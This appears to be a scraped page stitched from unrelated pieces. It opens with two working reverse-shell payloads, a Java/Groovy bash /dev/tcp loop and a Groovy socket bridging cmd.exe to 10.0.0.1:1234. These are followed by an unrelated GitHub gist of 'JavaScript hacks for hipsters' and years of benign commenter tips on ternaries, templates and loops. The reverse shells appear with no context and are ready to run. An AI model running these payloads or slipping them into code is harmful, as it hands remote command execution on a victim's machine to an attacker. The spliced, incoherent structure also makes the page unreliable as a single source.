
https://gist.github.com/berzniz/7632148
<br>
<br>
<br>

Java #
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/1234;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()

///////////////////////////////////
//////////////////////////////////

Groovy 3 #
String host="10.0.0.1";
int port=1234;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
Note: Java reverse shell also works for Groovy.

///////////////////////////////////
//////////////////////////////////

Some small javascript hacks for hipsters
jshipster_and_and.js
// Boring
if (isThisAwesome) {
  alert('yes'); // it's not
}

// Awesome
isThisAwesome && alert('yes');

// Also cool for guarding your code
var aCoolFunction = undefined;
aCoolFunction && aCoolFunction(); // won't run nor crash
jshipster_debugger.js
var x = 1;
debugger; // Code execution stops here, happy debugging
x++;


var x = Math.random(2);
if (x > 0.5) {
  debugger; // Conditional breakpoint
}
x--;
jshipster_globals_for_debugging.js
var deeplyNestedFunction = function() {
  var private_object = {
    year: '2013'
  };
  
  // Globalize it for debugging:
  pub = private_object;
};

// Now from the console (Chrome dev tools, firefox tools, etc)
pub.year;
jshipster_join.js
['first', 'name'].join(' '); // = 'first name';

['milk', 'coffee', 'sugar'].join(', '); // = 'milk, coffee, sugar'
jshipster_method.js
// Boring
if (success) {
  obj.start();
} else {
  obj.stop();
}

// Hipster-fun
var method = (success ? 'start' : 'stop');
obj[method]();
jshipster_or_or.js
// default to 'No name' when myName is empty (or null, or undefined)
var name = myName || 'No name';


// make sure we have an options object
var doStuff = function(options) {
  options = options || {};
  // ...
};
jshipster_templates.js
var firstName = 'Tal';
var screenName = 'ketacode'

// Ugly
'Hi, my name is ' + firstName + ' and my twitter screen name is @' + screenName;

// Super
var template = 'Hi, my name is {first-name} and my twitter screen name is @{screen-name}';
var txt = template.replace('{first-name}', firstName)
                  .replace('{screen-name}', screenName);
jshipster_timing.js
var a = [1,2,3,4,5,6,7,8,9,10];

console.time('testing_forward');
for (var i = 0; i < a.length; i++);
console.timeEnd('testing_forward');
// output: testing_forward: 0.041ms

console.time('testing_backwards');
for (var i = a.length - 1; i >= 0; i--);
console.timeEnd('testing_backwards');
// output: testing_backwards: 0.030ms 
jshipster_xxx.js
var z = 15;
doSomeMath(z, 10);
xxx // Great placeholder. I'm the only one using xxx and it's so easy to find in code instead of TODOs
doSomeMoreMath(z, 15);
@icanhazstring
icanhazstring commented on Nov 25, 2013
Just a small addition to the for-loop:

// generating simple 10000 entries
var a = [];
for(var i = 0; i<10000; i++) { a[i] = i; }

console.time('testing_forward');
for (var i = 0; i < a.length; i++);
console.timeEnd('testing_forward');
// output: testing_forward: 9.000ms

console.time('testing_backwards');
for (var i = a.length - 1; i >= 0; i--);
console.timeEnd('testing_backwards');
// output: testing_backwards: 6.000ms

console.time('testing_backwards_adv');
var count = a.length;
for(;count--;);
console.timeEnd('testing_backwards_adv');
// output: testing_backwards_adv: 4.000ms
The advanced one is taking advantage of the fact that basicly all parameters for a 'for-loop' are optional.
So the second one is the condition which gets validated to 0 (or as a bool -> false).

@yyx990803
yyx990803 commented on Nov 25, 2013
backwards could just be while (count--)

@yyx990803
yyx990803 commented on Nov 25, 2013
A personal trick for branching if... else...

var a = one
    ? two
        ? 'one && two'
        : 'one && !two'
    : three
        ? '!one && three'
        : '!one && !three'
Be careful when you have more complex expressions inside though, add parentheses where appropriate.

@yyx990803
yyx990803 commented on Nov 25, 2013
Another super light template:

var data = {
    firstName: 'Mike',
    lastName: 'Tyson'
}

var template = 'Hello my name is {{firstName}} {{lastName}}'

function render (template, data) {
    return template.replace(/{{(.+?)}}/g, function (m, p1) {
        return data[p1]
    })
}

console.log(render(template, data))
@berzniz
Author
berzniz commented on Nov 25, 2013
Very cool stuff! I'll probably borrow the branching if/else. It's something I always had problems with

@icanhazstring
icanhazstring commented on Nov 25, 2013
Also a cool thing: Getting bool value out of everything (!!).

E.g: Check content in array

var arr = [];
!!arr.length // false
Check for undefined or zero values:

var a = undefined;
var b = 0;
var c = 1;

!!a // false
!!b // false
!!c // true
@adriancooney
adriancooney commented on Nov 25, 2013
Also, a handy multiline string hack:

var multiline = function(string) { 
  // Replace the "function() {/*\n" and "\n*/}" with nothing and bam, multiline strings
  return string.toString().replace(/(^[^\n]*\n)|(\n\*\/\})/g, ""); 
};

console.log(multiline(function() {/*
Hello world!
I'm a multiline string!

Tada!
*/}));
@pablojim
pablojim commented on Nov 26, 2013
A small change to the or method:

// Boring
if (success) {
  obj.start();
} else {
  obj.stop();
}

// Why not just?
success ? obj.start() : obj.stop();
@kelong
kelong commented on Nov 26, 2013
Getting bool value out of everything (!!)
works also with empty strings which is great.
var a = '';
!!a // false

@joeljuca
joeljuca commented on Nov 29, 2013
The jshipster_method.js could also embed the ternary operator in the method calling. Like:

MyClass[(someBoolean ? "myMethod" : "myOtherMethod")]();

@skotchio
skotchio commented on Dec 1, 2013
// make sure we have an options object
var doStuff = function(options) {
  options = options || {};
  // ...
};
I thing the following is better:

options || (options = {});
@LostCrew
LostCrew commented on Dec 8, 2013
@pablojim and again, why not:

obj[success ? 'start' : 'stop']();
this is the most coincise form.

@Alexander-0x80
Alexander-0x80 commented on Dec 30, 2013
// Boring
if (isThisAwesome) {
    alert('yes'); // it's not
}  else {
   alert('no');
}


// Awesome
(isThisAwesome && alert('yes'))
    || alert('no');
@cScarlson
cScarlson commented on Aug 11, 2016
if ( !~['x'].indexOf('y') ) log('Not Found'), alert('Not Found'); // (!~-1 === true) runs both functions

@cScarlson
cScarlson commented on Aug 12, 2016 • 
Sequencial Arrays

Array.apply(null, { length: 5 })
// > [ undefined, undefined, undefined, undefined, undefined ]

Array.apply(null, { length: 5 }).map(Number.call, Number)
// > [ 0, 1, 2, 3, 4 ]
@cScarlson
cScarlson commented on Aug 15, 2016 • 
Control Falsey Values Using 'Inline Maps':

var existent = { true: true, false: false, null: false, undefined: false, '': false, 0: true }[ bool ];
{ ... }[ 1-1 ]; // true
{ ... }[ undefined ]; // false
...

Though, it is probably better to invert our logic so that other values of, say, 1 "string" etc don't return the wrong boolean:

function is(value) {
    var isnt = { undefined: true, null: true, false: true, '': true, 0: false }[ value ];
    return !isnt;
}

is(undefined);  // > false
is(null);  // > false
is(false);  // > false
is('');  // > false
is(0);  // > true
is(true);  // > true
is(1);  // > true
is('truthy');  // > true
is( {} );  // > true
@cScarlson
cScarlson commented on Aug 15, 2016
Compare Id's [Loosely] Regardless of Type
if (number.toString() === string.toString()) return dictionary.get(+string);

@jedwards1211
jedwards1211 commented on Nov 4, 2016
funny how string templates became a standard thing in ES2015.

Also, I use || for defaults all the time. I don't know if this can be called a hipster thing though, I think I remember seeing Douglas Crockford explaining this in a video. I think I even remember seeing him call && a guard because of that way it can be used.

@jedwards1211
jedwards1211 commented on Nov 4, 2016 • 
@Alexander-0x80 actually you can get rid of the parentheses entirely:

isThisAwesome && alert('yes') || alert('no')
It's the hipster ternary. (One could just as easily write:)

isThisAwesome ? alert('yes') : alert('no')
@jedwards1211
jedwards1211 commented on Nov 4, 2016
Hipster return undefined:

function maybeParse(str) {
  if (str) return parse(str)
}
@jedwards1211
jedwards1211 commented on Nov 4, 2016
I like how back in the days of obfuscated Perl contests, no one talked about Perl hipsters. The whole idea that this has to do with hipsters is really a false perception.

@facehead23
facehead23 commented on Nov 25, 2016 • 
<d>

@jedwards1211
jedwards1211 commented on Nov 28, 2016
Actually I wasn't thinking, isThisAwesome && alert('yes') || alert('no') is not equivalent to a ternary operator. I've seen it used to get values from options with a default:

const message = options && options.message || 'hello world'
@Ali-Amechghal
Ali-Amechghal commented on Dec 2, 2016
Convert to signed 32bit int:

strVal | 0
Convert to unsigned 32bit int:

strVal>>>0
@ayunami2000
ayunami2000 commented on Dec 26, 2016 • 
for jshipster_templates.js

var txt = 'Hi, my name is {first-name} and my twitter screen name is @{screen-name}'.replace('{first-name}', firstName).replace('{screen-name}', screenName);
one line!!!

@ayunami2000
ayunami2000 commented on Dec 26, 2016
var screen = 'Dat Boi';
var user = '@DatBoi';
var rank = 'MLG';
var txt = 'lel\n\n\nnubz';
var msg = '{rank} {screen} {user}: {msg}'.replace('{user}', '('+user+')').replace('{rank}', '['+rank+']').replace('{msg}', txt).replace('{screen}', screen);
alert(msg);
@mrvijayakumar
mrvijayakumar commented on Oct 24, 2017 • 
Awesome stuffs.. i loved it... :) thanks for sharing mates. Here is mines, which i got from internet.

Converting to number using + operator:

This magic is awesome! And it’s very simple to be done, but it only works with string numbers, otherwise it will return NaN(Not a Number). Have a look on this example:

function toNumber(strNumber) {  
    return +strNumber;
}
console.log(toNumber("1234")); // 1234  
console.log(toNumber("ACB")); // NaN 
console.log(+new Date()) // 1461288164385   
@cScarlson
cScarlson commented on Jan 18, 2018 • 
Micro Templates:

var item = { id: 998, content: "Orange Juice" };
var markup = [
    '<li id="item-', item.id ,'">',
        item.content,
    '</li>'
].join('');

element.appendChild(markup);
// > <li id="item-998">Orange Juice</li>
Likewise, we could make this template reusable using indices as placeholders:

var markup = [
    '<li id="item-', undefined ,'">',
        undefined,
    '</li>'
];

markup[1] = item.id;
markup[3] = item.content;
let html = markup.join('');
And you can use and index/key map, as well:

var map = { '1': 'id', '3': 'content' };
for (let i = markup.length; i--;) if (!markup[i]) markup[i] = item[ map[i] ];
let html = markup.join('');
@cScarlson
cScarlson commented on Jan 18, 2018 • 
Don't Use Switch Statements


They are not Reusable. They are not Extensible. They are not SOLID.

Bad

function handleActions(action) {
    switch (action.type) {
        case 'delete':
            this.handleDelete(action.data);
            break;
        case 'create':
            this.handleCreate(action.data);
            break;
        case 'update':
            this.handleUpdate(action.data);
            break;
        case 'upsert':
            this.handleCreate(action.data);
            this.handleUpdate(action.data);
            break;
        case 'fall...':
        case '...through...':
        case '...statement':
            this.handleActionForFallThrough(action.data);
            break;
        default:
            this.handleDefault(action.data);
    }
}
Good

var actions = {
    'delete': handleDelete,
    'create': handleCreate,
    'update': handleUpdate,
    'upsert': function handleUpsert(data) {
        this['create'](data);
        this['update'](data);
    },
    'fall...': handleActionForFallThrough,
    '...through...': handleActionForFallThrough,
    '...statement': handleActionForFallThrough,
    'default': new Function(),
};

var handler = actions[action.type] || actions['default'];
handler.call(actions, action.data);
With this, we can port around or inject an object instead of a function. Moreover, we can extend a Base Class of Action-Handlers. We can then extend an object/Class instead of having to modify the sourcecode of the function containing the switch statement. Likely, more and more case clauses would have to be added to the switch. Otherwise, the Functional Programming approach would still wrap the function with another and only invoke the base function in certain clauses (likely default). But it is difficult to mitigate duplication with such approach and you're likely to even have undesired side-effects of flow-control. Just don't use switches -- ever -- unless you have a really good reason.

class Actions {
    // ... see above
}

class MyActions extends Actions {
    'default': handleMyDefault
}
The only thing to worry about with this approach is fall-through statements, but they're not very tricky and the tradeoff is well worth it in the end. Another way to simplify fall-throughs, though, is to redesign the schema of your switch target ("actions.type" in this case), if you can without breaking backward-compatibility.

See Todd Motto's article for better descriptions.

@cScarlson
cScarlson commented on Jan 18, 2018 • 
Execution Guards

Often we see code like the following:

function handleData(e, data) {
    
    if (!data || data.id != this.id) {
        return;
    } else if(data && data.id == null) {
        throw new Error("Id is missing");
    } else {
        var id = data.id;
        this.id = id;
        this.item = data;
        this.http.get('/items/details/' + id).then(...);
        // ...
    }

}
Use exit conditions instead:

function handleData(data) {
    if (!data || !this[data.id]) return;
    if (data && !data.id) throw new Error("Id is missing");
    var id = +data.id;
    
    this.id = id;
    this.item = data;
    this.http.get(`/items/details${id}`).then(...);
}
We have a completely normal looking function other than some guards above. This also makes it clear what actions should be taken if the function doesn't behave as desired, and everything is declared at the top in one place as a docket for what undesired effects to look out for -- before any [potentially hazardous] variables are even declared.

Obviously, the former approach was written worse than it had to be in other ways, but typically these other practices come along with general bad, unreadable coding.

@cScarlson
cScarlson commented on Jan 18, 2018 • 
Unique Primitives (Set):

function unique(array) {
    var array = array || [ ]
    , hash = { }
    ;

    for (let i = array.length; i--;) hash[ array[i] ] = true;

    return Object.keys(hash);
}

var unique1 = unique([ 1, 2, 3, 4, 1, 2 ]);  // > [ 1, 2, 3, 4 ]
This is because:

var object = {  };
object[1] = true;
object[1] = false;
// > Object { 1: false }
Note that this will not work with typeof === "object" or "function", unless you JSON.stringify the Object or Array. However, you can use a function as a key.

var o = {};
var x = {};
var y = [];
var z = function fn() {};

o[x] = x;
o[y] = y;
o[z] = z;

o;  // > { [object Object]: {}, "": [], function fn() {}: f fn() }
// Object.prototype.toString() -> [object Object]
@cScarlson
cScarlson commented on Jan 18, 2018
Arbiter Pattern

Decorate a Function instance as a namespace so you can invoke the namespace with default (arbitrated) behavior. Use a "Facade" to protect private methods on the class.

var Class = function Class() {

    function publicMethod() {}
    function privateMethod() {}

    // export precepts
    this.publicMethod = publicMethod;
    this.privateMethod = privateMethod;

    return this;
};

var Facade = function Facade($class) {

    function init() {
        $class.privateMethod();
    }

    function doDefault() {
        return this;
    }

    function publicMethod(param) {
        $class.publicMethod(param);
        return this;
    }

    // export precepts
    this.doDefault = doDefault;
    this.publicMethod = publicMethod;

    return this;
};

var A = new (function Arbiter(Class, Facade) {
    var options = { };

    var F = Facade.call(function F() {
        if (this instanceof F) return new Arbiter(Class, Facade);
        return F.doDefault.apply(F, arguments);
    }, new Class());

    return F;  // as A
})(Class, Facade);

A() === A.doDefault() === A.publicMethod()() === A()()();
A.publicMethod();
A.privateMethod();  // Error
let a = A
  , b = new A()
  ;
a === b;  // false
@cScarlson
cScarlson commented on Jan 22, 2018 • 
Sorting Collections on Multiple Keys [ Efficiently ]

Intention

You may have a sort function that is being called in multiple parts of an application where the the sorting logic. You also may have to sort upon multiple keys of items in a collection and the prioritization of how those keys should effect the sorting algorithm may vary across modules. When these criteria are the case, it may be better to modify the source code of the sorting function, this is a problem if you are using the sorter in multiple places. Even in the case of only one module calling Array.prototype.sort, you may still want a single sort function whose signature remains the same and operates just like any other basic sort function.

TL:DR:

var Model = function Model(a, b, c, d) {

    this.a = a;
    this.b = b;
    this.c = c;
    this.d = d;

    return this;
};

var collection = [
    new Model(3, 3, 3, 3),
    new Model(2, 2, 2, 2),
    new Model(0, 1, 2, 3),
    new Model(0, 1, 2, 2),
    new Model(1, 2, 3, 1),
    new Model(1, 2, 2, 1),
    new Model(0, 0, 0, 0),
    new Model(1, 1, 1, 1),
];

// 3: Sort by Multiple keys (Reusable) using sortByKey()
function sortByKey(k, a, b) {
    if (a[k] > b[k]) return  1;
    if (a[k] < b[k]) return -1;
    return 0;
}

// 6: Sort by Multiple keys (Reusable + Optimized) using Reusable prioritySort()
function prioritySort(keys, a, b) {
    var i = 0, keys = Array.prototype.slice.call(keys || [ ], 0);
    while (i === 0 && keys.length) i = sortByKey.call(this, keys.shift(), a, b);
    return i;
}
var sort = prioritySort.bind(collection, [ 'a', 'b', 'c', 'd' ]);
collection.sort(sort);
console.log('>', collection);
// >
[
    { "a": 0, "b": 0, "c": 0, "d": 0 },
    { "a": 0, "b": 1, "c": 2, "d": 2 },
    { "a": 0, "b": 1, "c": 2, "d": 3 },
    { "a": 1, "b": 1, "c": 1, "d": 1 },
    { "a": 1, "b": 2, "c": 2, "d": 1 },
    { "a": 1, "b": 2, "c": 3, "d": 1 },
    { "a": 2, "b": 2, "c": 2, "d": 2 },
    { "a": 3, "b": 3, "c": 3, "d": 3 }
]
Details
@mendes5
mendes5 commented on Aug 29, 2019 • 
Fast prototyping:
html:

<button btn >Test</button>
<canvas x ></canvas>
js:

const button = document.querySelector('[btn]');
const canvas = document.querySelector('[x]');
Logging on arrow functions
Pretty common but didn't see anyone pointing it here

// convert it
const myFunction (a, b) => doStuff(a, b);
// to it
const myFunction (a, b) => console.log('called myFunction') || doStuff(a, b);
Clearing the console screen without calling functions
Object.defineProperty(window, 'clear', { // or `cls` if you want
  get() {
    console.clear();
  }
});
Now just type clear and hit enter. You can do this with pretty much anything actually.

Random item of array:
const myArray = ['a', 'b', 'c', 'd', 'e'];

const randomItem = myArray[Math.random() * myArray.length << 0]; // `0.999 << 0` returns `0`
Key/Value looping (if you use for loops)
const thing = {
  a: 1,
  b: 2,
  c: 3,
};

for(let [key, value] of Object.entries(thing)) {
 console.log(key, value);
}
Safe deep property access:
const safeAccess = (obj, path = []) =>
  obj && path.length
    ? safeAccess(obj[path[0]], path.slice(1))
    : obj;

//Before:
const size = nested 
  && nested.input 
  && nested.input.files
  && nested.input.files[0]
  && nested.input.files[0].meta
  && nested.input.files[0].meta.size;

//Now:
const size = safeAccess(nested, ['input', 'files', 0, 'meta', 'size']);
Operations on the parameter list
const itemAt = (array, index, value = array[index]) => value;

itemAt(['a', 'b', 'c', 1]); // 'b'
Random Proxy hacks:
const it = new Proxy({}, { get(target, name) { return x => x[name] } })
array.map(x => x.propName)
// vs
array.map(it.propName)

const call = new Proxy({}, { get(target, name) { return x => x[name]() } })
fetch(...).then(x => x.json()).then(console.log)
// vs
fetch(...).then(call.json).then(console.log)

const method = new Proxy({}, { get(target, name) { return (...args) => x => x[name](...args) } })
array.forEach(obj => obj.update('A', 1))
// vs
array.forEach(method.update('A', 1))

const eq = new Proxy({}, { get(target, name) { return comp => x => x[name] === comp } })
array.find(item => item.id === 'uuid')
// vs
array.find(eq.id('uuid'))
Im pretty sure that some of this stuff is illegal in some countries...
